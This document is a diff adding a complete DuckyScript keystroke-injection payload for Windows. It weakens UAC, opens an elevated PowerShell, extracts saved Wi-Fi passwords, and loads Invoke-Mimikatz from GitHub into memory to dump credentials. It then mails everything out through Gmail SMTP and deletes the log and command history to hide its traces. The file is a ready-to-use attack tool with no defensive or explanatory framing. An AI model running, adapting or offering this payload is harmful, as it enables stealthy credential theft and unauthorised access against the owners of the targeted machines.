@@ -1,0 +1,131 @@
+REM Author dubididum
+REM 27 March 2018
+REM Version 1.0
+REM Set UAC
+DELAY 5000
+CONTROL ESCAPE
+DELAY 5000
+STRING S
+DELAY 100
+STRING y
+DELAY 100
+STRING s
+DELAY 100
+STRING t
+DELAY 100
+STRING e
+DELAY 100
+STRING m
+DELAY 100
+STRING s
+DELAY 2000
+ENTER
+DELAY 5000
+STRING B
+DELAY 100
+STRING e
+DELAY 100
+ENTER
+DELAY 5000
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+ENTER
+DELAY 1500
+TAB
+DOWNARROW
+DOWNARROW
+DOWNARROW
+TAB
+ENTER
+DELAY 1000
+LEFTARROW
+ENTER
+DELAY 3000
+WINDOWS d
+DELAY 500
+REM open admin-cmd
+CONTROL ESCAPE
+DELAY 2500
+STRING cmd
+DELAY 1000
+CTRL-SHIFT ENTER
+DELAY 5000
+STRING powershell
+ENTER
+DELAY 5000
+REM set email credentials
+STRING $emailaddress = "youremail@gmail.com"
+ENTER
+STRING $emailpwd = "yourpassword"
+ENTER
+REM set log variables and function
+STRING $logfilepath = "$HOME\Desktop\"
+ENTER
+STRING $logfile = "$HOME\Desktop\a.txt"
+ENTER
+STRING if (!(test-path -path $logfile)){new-item -path $logfilepath -name "a.txt" -itemtype "file"}else{"" > $logfile}
+ENTER
+STRING Function LogWrite{Param ([string]$logstring);Add-content $Logfile -value $logstring}
+ENTER
+REM get wlan ssid and key
+STRING $output = netsh wlan show profiles | select-string "Profil" | select-object -Skip 3
+ENTER
+DELAY 1200
+STRING $computername = get-wmiobject Win32_ComputerSystem | select-object -expandproperty name
+ENTER
+DELAY 500
+STRING LogWrite "ComputerName: $computername";LogWrite ""
+ENTER
+DELAY 200
+STRING foreach ($string in $output){$ssid = ($string -split ":")[-1].Trim() -replace '"';$pwdstring = netsh wlan show profiles name="$ssid" key=clear | select-string "Schl" |select-object -Last 1;$wifipwd = ($pwdstring -split ":")[-1].Trim() -replace '"';LogWrite "SSID: '$ssid'   Password: '$wifipwd'"}
+ENTER
+DELAY 1000
+STRING LogWrite "";LogWrite "";LogWrite "---------------------------------------------------------";LogWrite "";LogWrite "";
+ENTER
+REM load invoke-mimikatz in mem
+STRING IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
+ENTER
+DELAY 3000
+STRING $mimikatz = Invoke-Mimikatz -DumpCreds
+ENTER
+DELAY 10000
+STRING LogWrite $mimikatz
+ENTER
+DELAY 500
+REM send information via mail
+STRING $SMTPServer = 'smtp.gmail.com'
+ENTER
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+ENTER
+STRING $SMTPInfo.EnableSsl = $true
+ENTER
+DELAY 100
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential("$emailaddress", "$emailpwd")
+ENTER
+STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
+ENTER
+STRING $ReportEmail.From = $emailaddress
+ENTER
+STRING $ReportEmail.To.Add($emailaddress)
+ENTER
+STRING $ReportEmail.Subject = 'some infos for you'
+ENTER
+STRING $ReportEmail.Body = (Get-Content $logfile | out-string)
+ENTER
+STRING $SMTPInfo.Send($ReportEmail)
+ENTER
+DELAY 2000
+REM remove temp-file
+STRING remove-item -path $logfile
+ENTER
+DELAY 200
+REM clear all commands
+STRING clear-history
+ENTER
+STRING exit
+ENTER
+STRING exit
+ENTER
